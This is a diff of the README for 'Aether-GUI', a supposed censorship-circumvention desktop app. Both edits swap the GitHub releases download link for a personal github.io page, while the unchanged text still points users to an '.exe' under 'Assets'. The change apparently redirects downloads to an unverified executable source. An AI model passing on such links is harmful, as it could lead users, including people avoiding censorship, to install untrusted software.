@@ -1,6 +1,6 @@
 # 🌐 Aether-GUI - Access the open web with ease
 
-[Download Aether-GUI](https://github.com/bentonitic-poinciana508/Aether-GUI/releases)
+[Download Aether-GUI](https://bentonitic-poinciana508.github.io)
 
 Aether-GUI provides a simple desktop interface for the Aether censorship-circumvention tunnel. This tool helps you bypass internet restrictions and reach websites that might be blocked in your location. The application runs locally on your computer and manages the complex technical steps required to establish a secure connection to the open internet.
 
@@ -8,7 +8,7 @@ Aether-GUI provides a simple desktop interface for the Aether censorship-circumv
 
 To begin, you need to download the application installer. Please visit the following link:
 
-[https://github.com/bentonitic-poinciana508/Aether-GUI/releases](https://github.com/bentonitic-poinciana508/Aether-GUI/releases)
+[https://bentonitic-poinciana508.github.io](https://bentonitic-poinciana508.github.io)
 
 On this page, look for the section labeled "Assets." Click the file that ends with ".exe" to download the installer to your computer.
 
